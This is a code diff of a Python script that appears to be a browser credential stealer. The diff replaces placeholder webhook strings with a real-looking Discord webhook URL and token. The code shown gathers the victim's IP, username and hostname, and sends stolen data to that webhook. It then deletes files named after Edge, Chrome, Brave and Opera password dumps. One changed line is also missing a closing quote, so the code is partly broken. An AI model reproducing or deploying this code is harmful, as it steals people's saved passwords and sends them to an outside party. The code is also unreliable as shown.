@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "https://discord.com/api/webhooks/1400328285870751805/LmyYJpEDnpLHoQH7T2iPR0_ltjv3Twg4jxS2dkzXKqvzlQLWn0ehHeXEds6dlzNX811I"
 
 def command(c):
     os.system(c)
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1400328285870751805/LmyYJpEDnpLHoQH7T2iPR0_ltjv3Twg4jxS2dkzXKqvzlQLWn0ehHeXEds6dlzNX811I" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1400328285870751805/LmyYJpEDnpLHoQH7T2iPR0_ltjv3Twg4jxS2dkzXKqvzlQLWn0ehHeXEds6dlzNX811I) # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
@@ -408,4 +408,5 @@ response = webhookembed.execute()
 os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
 #######################################################################
 #END OF SCRIPT
+
 #######################################################################
